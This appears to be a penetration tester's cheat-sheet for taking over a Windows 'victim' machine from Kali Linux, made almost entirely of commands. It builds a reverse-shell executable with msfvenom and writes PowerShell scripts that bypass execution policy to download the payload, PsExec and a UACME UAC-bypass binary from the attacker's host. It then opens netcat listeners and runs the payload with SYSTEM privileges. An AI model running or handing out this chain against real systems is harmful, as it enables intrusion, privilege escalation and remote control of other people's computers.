msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe 

#show account settings 
net user <login> 

# download psexec to kali 
https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx

# upload psexec.exe file onto the victim machine with powershell script 
echo $client = New-Object System.Net.WebClient > script.ps1 
echo $targetlocation = http://192.168.56.102/PsExec.exe >> script.ps1 
echo $client.DownloadFile($targetlocation,psexec.exe) >> script.ps1 
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1 

# upload danger.exe file onto the victim machine with powershell script 
echo $client = New-Object System.Net.WebClient > script2.ps1 
echo $targetlocation = http://192.168.56.102/danger.exe >> script2.ps1 
echo $client.DownloadFile($targetlocation,danger.exe) >> script2.ps1 
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1 

# UAC bypass from precompiled binaries: 
https://github.com/hfiref0x/UACME

# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exeto victim pc with powershell 
echo $client = New-Object System.Net.WebClient > script2.ps1 
echo $targetlocation = http://192.168.56.102/Akagi64.exe >> script3.ps1 
echo $client.DownloadFile($targetlocation,Akagi64.exe) >> script3.ps1 
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1 

# create listener on kali 
nc -lvp 4444 

# Use Akagi64 to run the danger.exe file with SYSTEM privileges 
Akagi64.exe 1 C:\Users\User\Desktop\danger.exe 

# create listener on kali 
nc -lvp 4444 

# The above step should give us a reverse shell with elevated privileges 

# Use PsExec to run the danger.exe file with SYSTEM privileges 
psexec.exe –i –d –accepteula –s danger.exe



